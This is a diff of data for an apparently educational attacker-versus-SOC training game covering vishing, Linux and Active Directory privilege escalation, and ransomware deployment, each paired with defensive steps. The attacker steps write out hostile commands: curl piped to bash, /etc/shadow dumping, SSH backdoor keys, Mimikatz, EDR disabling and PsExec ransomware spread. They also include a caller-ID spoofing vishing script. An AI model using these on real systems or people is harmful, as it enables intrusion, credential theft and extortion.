+    "Unpatched CVEs with public Metasploit modules can be exploited in minutes. Critical vulnerability patch SLAs should be measured in hours.",
+    "Service accounts with excessive privileges and no MFA are a primary lateral movement path. Apply least privilege across all service accounts.",
+    "Credential Guard is free on Windows 10 and Server 2016+. Enable it everywhere to significantly raise the bar for Mimikatz-style credential dumping.",
+    "Golden Ticket remediation requires two krbtgt password rotations. A single rotation leaves all forged tickets valid.",
+    "EDR deployed on every endpoint, server, and domain controller is your most effective tool against post-exploitation activity."
+  ]
+}
+,
+{
+  id:3,name:"Social Engineering",icon:"🎭",
+  hackerTools:["Pretexting Scripts","Vishing","LinkedIn OSINT","Call Spoofing"],
+  socTools:["Security Awareness Training","Call Verification Policy","Vishing Simulations"],
+  hacker:{
+    prompt:"attacker@social:~$",
+    intro:["[*] Target: Acme Corp — IT helpdesk","[*] Objective: Extract credentials via phone manipulation","[*] Phase: Human exploitation / Pretexting",""],
+    steps:[
+      {name:"Target profiling",tool:"LinkedIn + OSINT",
+       cmd:"# Research target before calling\npython3 linkedin_scrape.py --company acmecorp --dept IT\nshodan search 'org:\"Acme Corp\"' --fields ip_str,port",
+       output:["[+] IT Helpdesk Manager: David Patel (8 yrs at Acme)","[+] Help Desk Staff: Emily Nguyen — joined 3 months ago","[*] Emily is new — less likely to know all procedures","[+] CRM system: Salesforce (from job listings)","[+] VPN solution: Cisco AnyConnect (LinkedIn post)","[+] CEO: Robert Chen — travelling to Singapore this week","[*] Travel info from CEO public Instagram story","[!] New staff + CEO travel = ideal vishing window"],
+       desc:"Before any social engineering call, attackers build a detailed profile from LinkedIn, job postings, social media and OSINT tools to sound completely credible.",
+       why:"Knowing the CRM, VPN vendor, staff names and CEO travel creates an authentic pretext. New employees are ideal targets — they haven't yet memorised all procedures.",
+       choices:[
+         {t:"Target Emily (new hire) and impersonate an IT vendor calling about a Cisco AnyConnect urgent update",c:true,explain:"New staff are less likely to question authority or know verification procedures. Vendor impersonation with real product names is highly convincing."},
+         {t:"Call the CEO directly and ask for his password",c:false,explain:"CEOs are high-risk targets — they have security briefings, assistants who screen calls, and are generally more suspicious of unusual requests."},
+         {t:"Send an email instead of calling",c:false,explain:"Phone calls create urgency and social pressure that email cannot replicate. Vishing (voice phishing) has a much higher success rate for credential extraction."},
+       ]},
+      {name:"Number spoofing setup",tool:"SpoofCard / VoIP",
+       cmd:"# Spoof Cisco TAC support number\nspoofcard --caller-id '+1-800-553-2447' \\\n          --voice-changer male \\\n          --target '+1-555-0172'  # Acme helpdesk",
+       output:["[*] Caller ID set to: +1-800-553-2447 (Cisco TAC)","[*] Voice changer: enabled (male, professional tone)","[*] Recording: enabled for playback analysis","[+] Ready to call","[*] Call script loaded:","    Pretext: Cisco emergency security patch","    Goal: VPN admin credentials","    Fallback: Remote access to 'verify the patch'"],
+       desc:"VoIP services allow attackers to display any caller ID. Combined with a professional script and the target's real product names, the call appears entirely legitimate.",
+       why:"When the caller ID shows a real vendor number and the caller knows the exact products in use, most helpdesk staff comply without questioning — it feels routine.",
+       choices:[
+         {t:"Spoof Cisco TAC number, use real product names from OSINT, reference the CEO's travel as urgency",c:true,explain:"Three layers of credibility: authentic caller ID, product knowledge, and organisational context. The CEO travel adds genuine urgency."},
+         {t:"Use your real phone number to avoid legal risk",c:false,explain:"Using your real number immediately exposes you. Caller ID spoofing is the foundation of successful vishing."},
+         {t:"Call from a withheld number",c:false,explain:"Withheld numbers raise immediate suspicion in professional helpdesk environments. A recognisable vendor number is far more convincing."},
+       ]},
+      {name:"The vishing call",tool:"Pretexting Script",
+       cmd:"# Live call transcript\n[RING] Emily answers: 'Acme Corp IT, Emily speaking'\n\nAttacker: 'Hi Emily, this is Marcus from Cisco TAC.\n  We have a P1 alert on your AnyConnect deployment —\n  CVE-2024-20359 is being actively exploited.\n  I need to verify your admin console is patched.\n  Can you confirm your VPN admin credentials\n  so I can check the patch status remotely?'",
+       output:["Emily: 'Oh — is this urgent?'","Attacker: 'Yes, we're seeing active exploitation at 3","  other companies your size right now. Your CEO is","  travelling — you don't want a VPN outage while","  he's trying to connect from Singapore.'","Emily: 'OK... the admin username is vpnadmin'","Emily: 'Password is AnyConnect#2024'","[+] VPN admin credentials CAPTURED","[+] Emily believed the call was legitimate throughout"],
+       desc:"The call uses urgency (active exploitation), authority (Cisco TAC), personal relevance (CEO travel), and a believable technical request to extract credentials within minutes.",
+       why:"Social engineering exploits human psychology — authority, urgency, and fear of consequences override standard security procedures. Training is the only technical control.",
+       choices:[
+         {t:"Use credentials immediately to access VPN — before Emily reports the call to her manager",c:true,explain:"Speed is critical. Emily may realise something is wrong or mention the call to a colleague. Use the credentials within minutes."},
+         {t:"Ask Emily for more information before hanging up",c:false,explain:"Prolonging the call increases the chance Emily becomes suspicious or a colleague overhears. Get credentials and end the call quickly."},
+         {t:"Send a follow-up email to confirm the credentials",c:false,explain:"Written requests create evidence and give Emily time to reconsider. Phone calls are deliberately ephemeral."},
+       ]},
+      {name:"Pivot from VPN access",tool:"Cisco AnyConnect + nmap",
+       cmd:"# Login with stolen VPN credentials\nanyconnect --server vpn.acmecorp.com \\\n           --user vpnadmin --pass AnyConnect#2024\n\n# Now on internal network\nnmap -sV 10.0.0.0/8 --open -p 22,3389,445,1433",
+       output:["[+] VPN connected as vpnadmin","[+] Internal network access: 10.0.0.0/8","[*] Scanning internal hosts...","10.0.1.10  — Domain Controller (port 389,445)","10.0.1.20  — SQL Server (port 1433)","10.0.1.50  — File Server (SMB)","[+] Full internal network now accessible","[!] vpnadmin has broad network access","[*] Moving to privilege escalation phase"],
+       desc:"VPN admin credentials provide full internal network access — the attacker is now inside the perimeter and can scan, pivot, and escalate exactly as if physically present.",
+       why:"VPN admin accounts are among the highest-value targets. A single successful vishing call provides the same access as a sophisticated technical breach.",
+       choices:[
+         {t:"Enumerate all internal hosts quietly and identify the Domain Controller for privilege escalation",c:true,explain:"Methodical enumeration with low scan rates avoids triggering IDS alerts. The DC is the ultimate target for domain-wide access."},
+         {t:"Access the file server immediately and start copying data",c:false,explain:"Large SMB transfers generate immediate DLP and SIEM alerts. Enumerate quietly first and plan the exfiltration carefully."},
+         {t:"Call Emily back pretending to be Cisco TAC and ask for more credentials",c:false,explain:"Calling back immediately increases suspicion. You already have VPN admin access — use it methodically."},
+       ]}
+    ]
+  },
+  soc:{
+    prompt:"analyst@soc:~$",
+    intro:["[*] SOC Alert: VPN login from unusual location","[*] Mission: Detect vishing attack and contain VPN compromise","[*] Tools: VPN Logs, SIEM, Awareness Platform",""],
+    steps:[
+      {name:"VPN anomaly detection",tool:"Cisco AnyConnect + SIEM",
+       cmd:"splunk search 'index=vpn action=connected earliest=-2h'\n| table user src_ip country bytes_in bytes_out session_duration",
+       output:["USER        SRC_IP          COUNTRY    BYTES_IN  SESSION","vpnadmin    185.220.101.x   Romania    0         12 mins","vpnadmin    10.22.1.45      UK (corp)  2.1GB     active","[ALERT] vpnadmin logged in from Romania (never before)","[ALERT] Concurrent sessions from 2 different countries","[ALERT] Romanian session preceded UK session by 8 minutes","[CRITICAL] Impossible travel detected for privileged account"],
+       desc:"VPN logs combined with SIEM geo-analysis detect impossible travel — the same account logging in from two countries within minutes of each other.",
+       why:"Privileged accounts like vpnadmin should have Conditional Access policies that block logins from unexpected countries entirely — not just alert on them.",
+       choices:[
+         {t:"Immediately terminate the Romanian session, lock vpnadmin account, and contact Emily",c:true,explain:"Terminate the attacker's session first. Lock the account to prevent re-entry. Contact Emily to understand how credentials were disclosed."},
+         {t:"Monitor the Romanian session to see what the attacker accesses",c:false,explain:"The attacker already has full VPN admin access to the internal network. Every minute of monitoring is a minute of free internal reconnaissance."},
+         {t:"Force a password reset on vpnadmin and continue monitoring",c:false,explain:"Password reset alone doesn't terminate the active session. The attacker's live connection must be explicitly killed first."},
+       ]},
+      {name:"Incident interview",tool:"Incident Response Process",
+       cmd:"# Interview Emily Nguyen (helpdesk)\n# Document: who called, what was said, what was provided\ncat incident_notes.txt",
+       output:["INCIDENT INTERVIEW — Emily Nguyen","Time: 14:23 today","Caller claimed: Cisco TAC, urgent CVE patch","Caller ID showed: +1-800-553-2447 (Cisco TAC real number!)","Caller knew: product names, CEO travel, her name","Information disclosed: vpnadmin username and password","Emily's assessment: 'It sounded completely legitimate'","[*] No policy violation by Emily — no verification procedure existed","[!] Root cause: No callback verification policy in place"],
+       desc:"The interview reveals the attack was successful because no verification procedure existed. Emily followed what felt like a legitimate request from a credible source.",
+       why:"Blaming the employee misses the root cause. If no verification policy exists, the organisation failed Emily — not the other way around. Fix the process, not the person.",
+       choices:[
+         {t:"Document the full call details, preserve logs, and initiate a company-wide vishing alert",c:true,explain:"Evidence preservation for IR. Company-wide alert warns other staff. This incident becomes a training example without shaming Emily."},
+         {t:"Reprimand Emily for disclosing credentials to an unknown caller",c:false,explain:"Emily had no written policy telling her how to verify vendor calls. Blaming individuals without fixing the process achieves nothing."},
+         {t:"Only document the incident and take no immediate communication action",c:false,explain:"Other staff may receive similar calls right now. Immediate company-wide alert is essential to prevent further compromise."},
+       ]},
+      {name:"Implement callback verification",tool:"Security Policy",
+       cmd:"# Deploy callback verification policy\ncat > callback_policy.md << EOF\n1. Never provide credentials over inbound calls\n2. Take caller name and callback number\n3. Hang up and call vendor on OFFICIAL number\n4. Verify ticket/case number with vendor independently\n5. All vendor calls logged in ITSM\nEOF\n# Run vishing simulation next week",
+       output:["[+] Callback verification policy published","[+] All IT staff training updated — 45 minutes module","[+] ITSM ticket required for all vendor credential requests","[+] Vishing simulation scheduled: next Tuesday","[*] Industry stats: callback policy reduces vishing","    success rate from ~65% to under 5%","[+] Policy effective immediately"],
+       desc:"A simple callback verification policy — hang up, look up the official number independently, call back — defeats virtually all vishing attacks at zero technology cost.",
+       why:"No technology stops social engineering. Callback verification combined with regular vishing simulations is the only reliable defence against phone-based attacks.",
+       choices:[
+         {t:"Deploy callback policy, run vishing simulations monthly, and reward staff who correctly challenge suspicious calls",c:true,explain:"Policy plus practice plus positive reinforcement. Monthly simulations keep the skill sharp. Rewards build the right culture around security challenges."},
+         {t:"Block all inbound calls from external numbers",c:false,explain:"Blocking all external calls is operationally catastrophic. Legitimate vendors, clients and partners call the helpdesk constantly."},
+         {t:"Only train the IT helpdesk team",c:false,explain:"Vishing targets any employee — finance for wire transfers, HR for employee data, executives for strategy. All staff require training."},
+       ]},
+      {name:"VPN hardening",tool:"Cisco AnyConnect + Azure AD",
+       cmd:"# Enforce MFA and geo-restrictions on VPN admin\naz ad policy --vpn-admin --require-mfa hardware-token\naz ad conditional-access --allow-countries GB,US,DE\nciscoasa# aaa-server vpnadmin privilege-level 3",
+       output:["[+] Hardware MFA token required for vpnadmin login","[+] VPN admin logins restricted to GB, US, DE only","[+] vpnadmin privilege level reduced from 15 to 3","[+] All VPN admin actions now require dual approval","[+] Session recording enabled for privileged VPN accounts","[*] Even with correct credentials, login from Romania","    would now be blocked at the Conditional Access layer"],
+       desc:"Technical controls that would have prevented this attack entirely: hardware MFA, geo-restrictions, least privilege, and session recording for privileged accounts.",
+       why:"Multiple technical layers mean that even if social engineering succeeds again, the stolen credentials alone are insufficient to gain access.",
+       choices:[
+         {t:"Hardware MFA, geo-fencing, least privilege on vpnadmin, and privileged session recording",c:true,explain:"Layered technical controls that break the attack chain at multiple points. Social engineering may always succeed occasionally — defence in depth limits the damage."},
+         {t:"Just require MFA for VPN admin logins",c:false,explain:"MFA alone is good but sophisticated vishing can include real-time MFA bypass (the attacker asks for the OTP code during the call). Multiple layers are needed."},
+         {t:"Create a new vpnadmin account and keep the old one active for monitoring",c:false,explain:"Keeping compromised credentials active for honeypot purposes requires specialist threat intelligence capability. Simply disable and replace."},
+       ]}
+    ]
+  },
+  lessons:[
+    "Social engineering exploits human psychology — authority, urgency, and fear bypass security training unless specific verification procedures exist.",
+    "A callback verification policy (hang up, find the official number independently, call back) defeats virtually all vishing attacks at zero cost.",
+    "New employees are primary vishing targets — they haven't memorised procedures and are less likely to challenge authority figures.",
+    "Caller ID spoofing makes any number appear on the recipient's screen. Never trust caller ID alone as verification.",
+    "Blame the process, not the person. If no verification policy existed, the organisation failed the employee — not the reverse."
+  ]
+},
+{
+  id:4,name:"Privilege Escalation",icon:"⬆️",
+  hackerTools:["LinPEAS","GTFOBins","sudo exploits","Mimikatz","BloodHound"],
+  socTools:["CrowdStrike EDR","PAM Solutions","SIEM","Active Directory Auditing"],
+  hacker:{
+    prompt:"attacker@target:~$",
+    intro:["[*] Initial access: low-privilege shell as www-data","[*] Objective: Escalate to root / Domain Admin","[*] Phase: Privilege Escalation",""],
+    steps:[
+      {name:"Local enumeration",tool:"LinPEAS",
+       cmd:"curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null",
+       output:["[*] LinPEAS v2024 — Local Privilege Escalation Awesome Script","","[!] SUID binaries found:","  /usr/bin/find (SUID root) ← GTFOBins exploit available","  /usr/bin/python3.9 (SUID root) ← direct shell escape","","[!] Sudo misconfiguration:","  www-data ALL=(ALL) NOPASSWD: /usr/bin/vim","","[!] Writable cron job: /etc/cron.d/backup_script","  Runs as root every 5 minutes","","[!] Kernel: 5.4.0-74 — CVE-2021-3493 (OverlayFS LPE)","[+] Multiple escalation paths identified"],
+       desc:"LinPEAS automatically enumerates every common privilege escalation vector — SUID binaries, sudo misconfigurations, writable cron jobs, and kernel CVEs — in seconds.",
+       why:"Manual enumeration takes hours. LinPEAS covers hundreds of checks in under two minutes. Defenders should run it on their own systems regularly to find gaps first.",
+       choices:[
+         {t:"Exploit /usr/bin/vim sudo misconfiguration — fastest and most reliable path",c:true,explain:"Sudo NOPASSWD on vim is a classic GTFOBins escalation. One command gives a root shell. No kernel exploit needed — less noise, more reliable."},
+         {t:"Exploit the kernel CVE for the most powerful access",c:false,explain:"Kernel exploits are noisier, less stable, and may crash the system. The sudo misconfiguration is cleaner and achieves the same root access."},
+         {t:"Modify the writable cron job and wait 5 minutes",c:false,explain:"Cron modification works but introduces a 5-minute delay. The sudo vim path gives immediate root. Always take the fastest reliable path."},
+       ]},
+      {name:"Sudo GTFOBins exploit",tool:"GTFOBins",
+       cmd:"# Exploit sudo vim misconfiguration (GTFOBins)\nsudo vim -c ':!/bin/bash'\n\n# Now root\nwhoami && id",
+       output:["root","uid=0(root) gid=0(root) groups=0(root)","","# Persistence — add backdoor SSH key","mkdir -p /root/.ssh","echo 'ssh-rsa AAAA...attacker_key' >> /root/.ssh/authorized_keys","chmod 600 /root/.ssh/authorized_keys","","# Dump /etc/shadow for offline cracking","cat /etc/shadow | head -5","root:$6$salt$hash...:19234:0:99999:7:::",
+         "www-data:!:...",
+         "svc_sql:$6$anothersalt$hash2...:19100::",
+         "[+] Root shell obtained. SSH backdoor planted. Shadow file copied."],
+       desc:"GTFOBins documents how legitimate Unix binaries can be abused to escape restricted shells, escalate privileges, or execute arbitrary code when misconfigured with sudo.",
+       why:"vim, python, find, awk, perl — dozens of standard binaries become escalation vectors when granted passwordless sudo access. Principle of least privilege prevents this entirely.",
+       choices:[
+         {t:"Plant SSH backdoor key in /root/.ssh AND dump /etc/shadow for offline cracking",c:true,explain:"Two persistence mechanisms: SSH key survives password resets; shadow file cracking gives additional account credentials for lateral movement."},
+         {t:"Only spawn the root shell and proceed",c:false,explain:"Without persistence, losing the shell means starting over. Always plant multiple backdoors before moving on."},
+         {t:"Immediately start exfiltrating data as root",c:false,explain:"Bulk data access as root generates massive SIEM alerts. Establish persistence first, then exfiltrate slowly and quietly."},
+       ]},
+      {name:"Active Directory enumeration",tool:"BloodHound",
+       cmd:"# Collected domain credentials from /etc/shadow crack\n# Now enumerate AD attack paths\nbloodhound-python -c All -u svc_sql -p 'Sql@Acme2024!' \\\n  -d acmecorp.local -ns 10.0.1.10",
+       output:["[*] Collecting AD data (users, groups, ACLs, sessions)...","[+] Collection complete. Importing to BloodHound...","","SHORTEST PATH TO DOMAIN ADMIN:","svc_sql → [MemberOf] → DB_Admins","DB_Admins → [GenericWrite] → IT_Admins group","IT_Admins → [MemberOf] → Domain Admins","","[!] svc_sql can add itself to Domain Admins in 3 steps","[!] No admin approval required for group membership changes","[+] Attack path identified — executing..."],
+       desc:"BloodHound maps Active Directory relationships and automatically finds the shortest privilege escalation path to Domain Admin using graph analysis.",
+       why:"AD environments accumulate permission misconfigurations over years. BloodHound finds attack paths that would take manual analysis days to discover — in seconds.",
+       choices:[
+         {t:"Execute the BloodHound path: add svc_sql to DB_Admins → exploit GenericWrite → Domain Admin",c:true,explain:"Follow the exact path BloodHound identified. Each step uses legitimate AD permissions — harder to detect than exploiting CVEs."},
+         {t:"Try to crack the Domain Admin password with hashcat",c:false,explain:"BloodHound just gave you a legitimate path to DA without needing the password. Cracking is slow, noisy, and unnecessary here."},
+         {t:"Brute-force the Domain Controller directly",c:false,explain:"Brute force against a DC triggers lockout policies and immediate SIEM alerts. The BloodHound path is silent and uses real permissions."},
+       ]},
+      {name:"Domain Admin via ACL abuse",tool:"PowerView",
+       cmd:"# Execute BloodHound attack path silently\nImport-Module PowerView\nAdd-DomainGroupMember -Identity 'IT_Admins' -Members 'svc_sql'\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'svc_sql'\n\n# Verify\nGet-DomainGroupMember 'Domain Admins' | Select MemberName",
+       output:["[+] svc_sql added to IT_Admins group","[+] svc_sql added to Domain Admins group","","MemberName","----------","Administrator","krbtgt","svc_sql   ← ATTACKER CONTROLLED","","[+] svc_sql is now Domain Admin","[+] Full domain control achieved","[*] All 847 user accounts now accessible"],
+       desc:"PowerView manipulates Active Directory objects directly using legitimate AD permissions. Adding accounts to privileged groups using GenericWrite rights generates minimal log noise.",
+       why:"ACL-based attacks are hard to detect because they use legitimate AD functionality. Monitoring for unexpected group membership changes is a key detective control.",
+       choices:[
+         {t:"Dump all AD credentials with DCSync and create a persistent Golden Ticket",c:true,explain:"DCSync pulls all AD hashes directly. Golden Ticket provides indefinite domain access even if svc_sql is removed from Domain Admins."},
+         {t:"Leave svc_sql in Domain Admins and use it for ongoing access",c:false,explain:"A service account suddenly in Domain Admins will be noticed quickly. Exfiltrate credentials and remove the evidence of group changes."},
+         {t:"Immediately access all file servers and export sensitive data",c:false,explain:"Bulk access triggers DLP and file server audit alerts. DCSync first — then you have all credentials and can move carefully."},
+       ]}
+    ]
+  },
+  soc:{
+    prompt:"analyst@soc:~$",
+    intro:["[*] EDR Alert: Suspicious process on web server","[*] Mission: Detect privilege escalation and contain","[*] Tools: CrowdStrike EDR, AD Auditing, PAM solution",""],
+    steps:[
+      {name:"EDR process alert",tool:"CrowdStrike Falcon",
+       cmd:"falcon-edr --host 10.0.1.100 --alerts --last 1h\nfalcon-edr --host 10.0.1.100 --process-tree --suspicious",
+       output:["[HIGH] Suspicious sudo execution detected","  User: www-data","  Command: sudo vim -c ':!/bin/bash'","  Result: bash shell spawned as root (UID 0)","  Time: 14:47:22","","[HIGH] SSH authorized_keys modified","  File: /root/.ssh/authorized_keys","  Action: New key added","  Time: 14:47:35","","[MEDIUM] /etc/shadow read by www-data process","[CRITICAL] Privilege escalation confirmed: www-data → root"],
+       desc:"CrowdStrike detects the sudo GTFOBins exploit by correlating the vim sudo execution with a bash shell spawn running as root — a clear behavioural indicator.",
+       why:"Signature-based detection misses novel exploits. Behavioural detection — a web server process spawning a root shell — catches GTFOBins abuse regardless of the specific binary used.",
+       choices:[
+         {t:"Isolate the host, terminate the root shell, remove the backdoor SSH key, and preserve memory",c:true,explain:"Contain first: isolate host, kill root shell, remove SSH backdoor. Then preserve memory image before rebooting — volatile evidence is lost on restart."},
+         {t:"Just remove the unauthorised SSH key and monitor",c:false,explain:"Removing the key doesn't address the active root shell or any other persistence mechanisms the attacker may have planted. Full isolation required."},
+         {t:"Reboot the server to terminate all attacker processes",c:false,explain:"Rebooting destroys volatile memory containing evidence of the attack chain. Isolate and forensically image first."},
+       ]},
+      {name:"Audit sudo configuration",tool:"Linux PAM / sudoers audit",
+       cmd:"# Find all dangerous sudo rules across the estate\nfor host in $(cat server_list.txt); do\n  ssh $host 'sudo -l -U www-data 2>/dev/null' 2>/dev/null\ndone | grep -i nopasswd",
+       output:["server-web-01:  www-data ALL=(ALL) NOPASSWD: /usr/bin/vim","server-web-02:  www-data ALL=(ALL) NOPASSWD: /usr/bin/python3","server-db-01:   postgres ALL=(ALL) NOPASSWD: /usr/bin/find","server-app-01:  deploy   ALL=(ALL) NOPASSWD: /bin/bash","","[CRITICAL] 4 servers with dangerous NOPASSWD sudo rules","[ACTION] All rules removed and replaced with explicit commands only"],
+       desc:"Auditing sudo rules across the entire estate finds misconfiguration spread over time — often by developers who added NOPASSWD access for convenience.",
+       why:"GTFOBins lists over 200 common binaries that escalate privileges when given sudo access. Any NOPASSWD rule for a listed binary is a privilege escalation path.",
+       choices:[
+         {t:"Remove all NOPASSWD sudo rules, replace with specific allowed commands, and deploy PAM solution",c:true,explain:"Correct hardening. Specific commands (e.g., service nginx restart) instead of whole binaries. PAM enforces MFA for sudo on sensitive servers."},
+         {t:"Only fix the vim rule on the compromised server",c:false,explain:"The same misconfiguration exists on 3 other servers. Fix all instances across the estate simultaneously."},
+         {t:"Disable sudo entirely on all web servers",c:false,explain:"Web servers need some sudo for legitimate administration. Remove dangerous rules and restrict to necessary commands only."},
+       ]},
+      {name:"BloodHound AD audit",tool:"BloodHound Enterprise",
+       cmd:"bloodhound-cli --find-paths-to-da --exclude-default-admin\nbloodhound-cli --find-acl-misconfigs --severity high",
+       output:["[CRITICAL] Attack paths to Domain Admin found: 23","","Top paths:","  svc_sql → DB_Admins → IT_Admins → Domain Admins (3 hops)","  svc_backup → GenericWrite on AdminSDHolder","  helpdesk_grp → ForceChangePassword on 12 admin accounts","","[HIGH] GenericWrite permissions on privileged groups:","  DB_Admins: 8 accounts can modify membership","  IT_Admins: 12 accounts can modify membership","","[ACTION] Remediate top 23 paths immediately"],
+       desc:"Running BloodHound defensively finds all attack paths to Domain Admin — the same paths attackers use. This proactive analysis enables systematic remediation.",
+       why:"Every organisation accumulates AD permission debt over time. Running BloodHound against your own environment regularly is one of the highest-value Active Directory security activities.",
+       choices:[
+         {t:"Remediate all 23 BloodHound attack paths and implement Tier 0 / Tier 1 / Tier 2 AD model",c:true,explain:"Systematic remediation of all paths plus AD tiering (privileged accounts only on privileged systems) eliminates entire classes of lateral movement."},
+         {t:"Only fix the specific path the attacker used",c:false,explain:"23 attack paths exist. Fixing one leaves 22. BloodHound gives you the full picture — remediate comprehensively."},
+         {t:"Disable BloodHound data collection to prevent attackers using it",c:false,explain:"BloodHound reads normal AD data accessible to any domain user. Disabling collection doesn't stop attackers — it just stops defenders from seeing the same view."},
+       ]},
+      {name:"Privileged Access Management",tool:"CyberArk PAM",
+       cmd:"# Deploy PAM solution for all privileged accounts\ncyberark-cli --vault-account svc_sql --rotate-password\ncyberark-cli --vault-account svc_backup --rotate-password\ncyberark-cli --enforce-jit --accounts 'Domain Admins'",
+       output:["[+] svc_sql password rotated — stored in vault, unknown to humans","[+] svc_backup password rotated — stored in vault","[+] Just-In-Time access enforced for Domain Admin group","  Domain Admin rights granted for max 4 hours per request","  Requires manager approval + MFA","  All sessions recorded","[+] 0 service accounts with known static passwords","[+] Domain Admin group membership: 0 permanent members"],
+       desc:"A PAM solution vaults all privileged account credentials, rotates them automatically, and enforces Just-In-Time access — no permanent Domain Admin membership.",
+       why:"Permanent Domain Admin membership is unnecessary for 99% of tasks. JIT access gives rights when needed and removes them automatically, dramatically shrinking the attack window.",
+       choices:[
+         {t:"Vault all service account credentials, enforce JIT for DA access, and record all privileged sessions",c:true,explain:"PAM eliminates static privileged credentials (no more cracking shadow files for usable passwords) and gives full audit trails for all privileged activity."},
+         {t:"Just rotate all service account passwords manually",c:false,explain:"Manual rotation creates new static passwords. PAM automates rotation and ensures humans never know the passwords — they can't be socially engineered out of them."},
+         {t:"Remove all service accounts from the domain",c:false,explain:"Service accounts run critical applications. Remove excessive privileges and vault credentials instead of eliminating them."},
+       ]}
+    ]
+  },
+  lessons:[
+    "LinPEAS finds privilege escalation paths in under 2 minutes. Run it on your own systems before attackers do.",
+    "GTFOBins documents 200+ common binaries that escalate privileges when given sudo NOPASSWD access. Audit all sudo rules across your estate.",
+    "BloodHound finds attack paths to Domain Admin that manual analysis would take days to discover. Run it defensively on your own environment quarterly.",
+    "Permanent Domain Admin membership is unnecessary. Just-In-Time access with approval workflows reduces the attack window to near zero.",
+    "ACL-based privilege escalation uses legitimate AD permissions and generates minimal logs. Monitor for unexpected group membership changes."
+  ]
+},
+{
+  id:5,name:"Ransomware Deployment",icon:"💀",
+  hackerTools:["Cobalt Strike","Mimikatz","PsExec","Custom Ransomware","C2 Framework"],
+  socTools:["EDR","Offline Backups","Network Segmentation","Incident Response Plan"],
+  hacker:{
+    prompt:"attacker@c2:~$",
+    intro:["[*] Domain Admin access obtained","[*] Objective: Deploy ransomware across the entire domain","[*] Phase: Impact / Ransomware deployment",""],
+    steps:[
+      {name:"Disable security tools",tool:"Cobalt Strike",
+       cmd:"# Running as Domain Admin via Cobalt Strike beacon\nbeacon> shell powershell -c \"Get-Service -Name 'CrowdStrikeFalconSensor' | Stop-Service -Force\"\nbeacon> shell sc config CSFalconService start=disabled\nbeacon> shell netsh advfirewall set allprofiles state off",
+       output:["[beacon] Domain Admin: ACMECORP\\Administrator","[+] CrowdStrike Falcon service stopped","[+] CrowdStrike Falcon disabled (won't restart on reboot)","[+] Windows Defender disabled via GPO","[+] Windows Firewall disabled on all profiles","[+] Event log cleared: System, Security, Application","[*] Security tools eliminated on primary target","[*] Propagating GPO to all domain computers...","[+] EDR disabled on 127 of 134 domain computers"],
+       desc:"Before deploying ransomware, attackers disable every security tool — EDR, AV, firewall, and event logging — using legitimate Domain Admin capabilities. This is standard ransomware tradecraft.",
+       why:"EDR is the primary detection mechanism for ransomware. Attackers always disable it first. The alert that EDR stopped reporting is itself a critical ransomware warning sign.",
+       choices:[
+         {t:"Disable EDR and AV via GPO, clear event logs, then wait 24 hours before deploying ransomware",c:true,explain:"Waiting 24 hours ensures backup jobs run and capture encrypted versions of files — destroying the most recent clean backup. This is standard ransomware operator tradecraft."},
+         {t:"Immediately deploy ransomware after disabling security tools",c:false,explain:"Immediately deploying misses the opportunity to corrupt backups. Professional ransomware groups wait to maximise the chance that encrypted files enter the backup chain."},
+         {t:"Only disable EDR on the most critical servers",c:false,explain:"Leaving EDR on workstations means detection when encryption begins. Disable everywhere via GPO for full stealth."},
+       ]},
+      {name:"Credential harvesting at scale",tool:"Mimikatz via GPO",
+       cmd:"# Deploy Mimikatz via GPO to harvest all credentials\nbeacon> powershell-import /tools/Invoke-Mimikatz.ps1\nbeacon> powershell Invoke-Mimikatz -DumpCreds -ComputerName (Get-ADComputer -Filter *).Name",
+       output:["[*] Harvesting credentials from 134 domain computers...","[+] Harvested 847 credential sets","[+] Domain Admin hashes: 12","[+] Service account hashes: 34","[+] User credential highlights:","    CEO: robert.chen  Password: Acme@CEO2024!","    CFO: sarah.jones  Password: Finance#2024","    CTO: mike.patel   Password: TechAdmin!23","[+] All C-suite credentials captured","[+] Offline backups accessible — backup operator creds captured"],
+       desc:"With Domain Admin rights, Mimikatz is deployed via GPO to every domain computer simultaneously, harvesting all cached credentials in a single operation.",
+       why:"Harvesting all credentials before encryption ensures multiple persistence mechanisms and enables access to backup systems — the most critical ransomware target.",
+       choices:[
+         {t:"Use backup operator credentials to access and corrupt/delete all offline backup systems",c:true,explain:"Destroying backups is the most impactful ransomware action. Victims with corrupted backups have no choice but to pay. This is why offline, air-gapped backups are essential."},
+         {t:"Encrypt immediately using Domain Admin credentials",c:false,explain:"Encrypting before corrupting backups leaves the victim with a recovery path. Always destroy backups first — that's what makes ransomware payments 'necessary'."},
+         {t:"Exfiltrate all data before encrypting for double extortion",c:false,explain:"Double extortion is valuable but takes time. The backup destruction must happen immediately before the victim realises what is happening."},
+       ]},
+      {name:"Lateral propagation",tool:"PsExec + custom ransomware",
+       cmd:"# Deploy ransomware binary to all domain computers via GPO\ncopy \\\\acmecorp.local\\SYSVOL\\acmecorp.local\\scripts\\update.exe\n# PsExec for immediate deployment to servers\nfor /f %i in (server_list.txt) do \\\n  psexec \\\\%i -s -d cmd /c \"C:\\Windows\\update.exe\"",
+       output:["[*] Ransomware binary deployed via SYSVOL to all 134 computers","[*] Starting encryption on all targets simultaneously...","","Encrypted: \\\\fileserver\\Finance (847 GB)","Encrypted: \\\\fileserver\\HR (234 GB)","Encrypted: \\\\sqlserver\\Databases (1.2 TB)","Encrypted: \\\\dc01\\SYSVOL (CRITICAL)","","[+] 2.3TB encrypted across 134 systems in 47 minutes","[+] Ransom note deployed to all desktops","[!] RANSOM: $2.4M USD in Bitcoin within 72 hours"],
+       desc:"Ransomware deployed via GPO and PsExec reaches every domain-joined computer simultaneously. With EDR disabled and backups corrupted, the attack is complete.",
+       why:"GPO deployment is fast, authenticated, and uses the same mechanism as legitimate Windows updates — it blends in perfectly with normal IT operations.",
+       choices:[
+         {t:"Exfiltrate 500GB of sensitive data to attacker C2 before final encryption — double extortion",c:true,explain:"Double extortion: 'pay or we publish your data online.' Even organisations with backups are pressured to pay to prevent data publication. Revenue doubled since 2020."},
+         {t:"Deploy ransomware only to file servers to minimise detection",c:false,explain:"Partial encryption leaves the victim with partial recovery options and more time to respond. Maximum impact requires encrypting everything simultaneously."},
+         {t:"Leave the Domain Controller unencrypted to maintain access",c:false,explain:"Encrypting the DC maximises damage and ransom leverage. Attackers have already established C2 persistence — DC access isn't needed post-encryption."},
+       ]},
+      {name:"Ransom note and C2 persistence",tool:"Custom C2 Framework",
+       cmd:"# Deploy ransom note and maintain C2 for negotiation\ncat ACME_CORP_README.txt",
